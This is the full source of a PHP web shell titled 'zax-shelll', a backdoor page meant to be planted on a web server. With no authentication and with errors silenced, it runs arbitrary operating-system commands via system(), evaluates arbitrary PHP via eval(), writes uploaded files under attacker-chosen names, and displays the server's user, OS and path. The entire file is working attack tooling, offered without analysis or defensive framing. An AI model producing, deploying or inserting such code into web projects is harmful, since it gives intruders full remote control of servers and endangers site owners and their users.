<?php
error_reporting(0);

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die();
}

if(isset($_REQUEST['code'])){
    eval($_REQUEST['code']);
    die();
}

if(isset($_REQUEST['upload'])){
    if(isset($_FILES['file'])){
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "File uploaded: ".$_FILES['file']['name'];
    }
    die();
}
?>
<html>
<head><title>Shell</title></head>
<body>
<h2>zax-shelll</h2>
<form method="post">
CMD: <input type="text" name="cmd" size="50" value="whoami">
<input type="submit" value="Execute">
</form>

<form method="post">
PHP Code: <textarea name="code" rows="3" cols="50">echo "Hello";</textarea>
<input type="submit" value="Eval">
</form>

<form method="post" enctype="multipart/form-data">
Upload File: <input type="file" name="file">
<input type="hidden" name="upload" value="1">
<input type="submit" value="Upload">
</form>

<?php
// System info
echo "<h3>System Info:</h3>";
echo "PHP: ".phpversion()."<br>";
echo "User: ".@exec('whoami')."<br>";
echo "OS: ".@php_uname()."<br>";
echo "Path: ".getcwd();
?>
</body>
</html>